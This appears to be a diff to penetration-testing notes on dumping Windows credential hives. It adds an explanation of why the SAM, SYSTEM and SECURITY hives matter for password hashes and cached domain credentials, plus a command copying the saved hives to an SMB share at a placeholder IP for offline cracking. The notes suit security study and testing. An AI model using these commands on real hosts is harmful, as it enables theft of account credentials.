@@ -15,3 +15,10 @@ reg.exe save hklm\system C:\system.save
 ```bash
 reg.exe save hklm\security C:\security.save
 ```
+Technically we will only need hklm\sam & hklm\system, but hklm\security can also be helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts.
+
+## Tarnsfer file
+We can create ftp, http or smb server to transfer these files to our linux machine.
+
+**Transfering to smb share from windows:**
+`move sam.save \\IP\sharename` same for system.save and security.save
